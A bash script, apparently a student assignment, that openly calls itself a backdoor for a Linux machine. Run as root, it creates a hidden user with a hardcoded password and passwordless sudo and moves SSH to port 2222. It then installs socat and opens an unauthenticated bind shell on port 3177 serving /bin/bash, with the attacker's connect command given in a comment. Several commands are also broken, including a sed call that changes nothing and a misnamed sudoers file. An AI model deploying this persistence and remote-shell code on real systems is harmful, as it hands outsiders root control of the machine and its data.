#!/usr/bin/env bash
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit
fi
 #exit out if user ran the script without root
echo "Script running ... .. .. ."
useradd -rMo -u 300 -p p4ssw0rd sysd #create a secret user with no home, and uid with 300
groupmod -g 300 sysd # give the GID sa
echo "Created secret user ..... .. . ."
cat /etc/passwd | grep -i sysd #check if user is created
#check if user has proper privileges for sysd mean u did the HW
# visudo < this will edit the sudoer file
# then look for sysd priv in file
# add 'NOPASSWD:ALL' to end of 'sysd ALL=(ALL:ALL) '
# sysd ALL=(ALL) NOPASSWD:ALL
# hopefully you have completed that
# then check if user has no password privileges
var=$(cat /etc/sudoer.tmp | grep -i sysd | awk '{ print $3 }')
vareql="NOPASSWD:ALL"
if [ $var != $vareql ]; then
  echo "Error sudoer file not properly configured .. .. ."
  echo " fix it ! :<"
  exit
else
  echo " check complete :) "
fi
#######################################################
################  Back DOOR           #################
################            By        #################
################    V   V    V   V    #################
################        Hershey       #################
################                      #################
#######################################################
#first stop the service if its running
serCek=$(systemctl is-active ssh.service)
if [ $ serCek = "active" ]; then
    echo "service running .... shutting it down"
    systemctl stop ssh.service
fi
echo "Starting the edditing..... >"
sed -n 's/Port 22/Port 2222/g' /etc/ssh/ssh_config #edit the ssh_config file silently
#restart the ssh services
systemctl restart ssh.service
echo -e "/nServices restarted "
TARGET_IP=$(hostname -I)
echo -e "/n SSH : ssh root@$TARGET_IP -p 2222"
###############################################################
echo -e "

   _____  ____   ______ ___   ______
  / ___/ / __ \ / ____//   | /_  __/
  \__ \ / / / // /    / /| |  / /
 ___/ // /_/ // /___ / ___ | / /
/____/ \____/ \____//_/  |_|/_/


"
sudo apt-get install socat -y
socat TCP4-Listen:3177,fork EXEC:/bin/bash #run the listener on the victim computer
#now computer will listen
#to connect to t the victim computer
#socat STDIO TCP4:TARGET_IP:3177
#now you can enter commands like in linux #!/usr/bin/env
